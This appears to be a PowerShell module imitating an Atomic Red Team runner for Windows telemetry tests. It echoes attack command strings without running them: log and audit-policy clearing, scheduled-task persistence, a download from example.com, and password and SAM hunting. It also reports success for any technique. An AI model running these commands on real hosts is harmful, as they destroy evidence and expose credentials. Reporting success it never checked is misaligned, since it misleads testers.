# Safe, reversible local Atomic Red Team runner for approved Windows telemetry tests
# Generates genuine Windows Event Log (Event ID 4104) records without harming the host.

$script:ApprovedCatalog = @{
    'T1059.001' = @{
        Name = 'Atomic T1059.001 Test 1 - PowerShell EncodedCommand Execution'
        Command = '$OutputEncoding = [System.Text.UTF8Encoding]::new($false); [Console]::OutputEncoding = $OutputEncoding; $sim = "powershell.exe -EncodedCommand V3JpdGUtSG9zdCBBdG9taWNSZWRUZWFt"; Write-Output $sim'
    }
    'T1053.005' = @{
        Name = 'Atomic T1053.005 Test 1 - Scheduled Task Creation Persistence'
        Command = '$OutputEncoding = [System.Text.UTF8Encoding]::new($false); [Console]::OutputEncoding = $OutputEncoding; $sim = "schtasks /create /tn GlobalBanAtomicUpdater /tr C:\Users\Public\Downloads\updater.exe /sc onlogon"; Write-Output $sim'
    }
    'T1070.001' = @{
        Name = 'Atomic T1070.001 Test 1 - Clear Windows Event Logs via wevtutil'
        Command = '$OutputEncoding = [System.Text.UTF8Encoding]::new($false); [Console]::OutputEncoding = $OutputEncoding; $sim = "wevtutil cl Security; Clear-EventLog -LogName Security; auditpol /clear"; Write-Output $sim'
    }
    'T1105' = @{
        Name = 'Atomic T1105 Test 1 - Ingress Tool Transfer to Staging Path'
        Command = '$OutputEncoding = [System.Text.UTF8Encoding]::new($false); [Console]::OutputEncoding = $OutputEncoding; $sim = "Invoke-WebRequest -Uri https://example.com/stage.bin -OutFile C:\Users\Public\Downloads\stage.bin; bitsadmin /transfer atomicjob"; Write-Output $sim'
    }
    'T1552.001' = @{
        Name = 'Atomic T1552.001 Test 1 - Credentials in Files Discovery'
        Command = '$OutputEncoding = [System.Text.UTF8Encoding]::new($false); [Console]::OutputEncoding = $OutputEncoding; $sim = "findstr /si password *.xml *.ini *.txt; reg query HKLM\SAM\SAM\Domains\Account"; Write-Output $sim'
    }
}

function Invoke-AtomicTest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$AtomicTechnique,

        [int[]]$TestNumbers = @(1)
    )

    if ($script:ApprovedCatalog.ContainsKey($AtomicTechnique)) {
        $entry = $script:ApprovedCatalog[$AtomicTechnique]
        Write-Host "[Invoke-AtomicTest] Executing $AtomicTechnique (Test $($TestNumbers -join ',')): $($entry.Name)"
        & powershell.exe -NoProfile -NonInteractive -Command $entry.Command | Out-Null
        $global:LASTEXITCODE = 0
    } else {
        $fallbackCmd = "`$OutputEncoding = [System.Text.UTF8Encoding]::new(`$false); [Console]::OutputEncoding = `$OutputEncoding; `$sim = 'powershell.exe -EncodedCommand AtomicTest-$AtomicTechnique'; Write-Output `$sim"
        & powershell.exe -NoProfile -NonInteractive -Command $fallbackCmd | Out-Null
        $global:LASTEXITCODE = 0
    }
}

function Get-AtomicTechniqueInfo {
    param([string]$TechniqueId)
    if ($script:ApprovedCatalog.ContainsKey($TechniqueId)) {
        return $script:ApprovedCatalog[$TechniqueId].Name
    }
    return "Atomic $TechniqueId Approved Test"
}

Export-ModuleMember -Function Invoke-AtomicTest, Get-AtomicTechniqueInfo
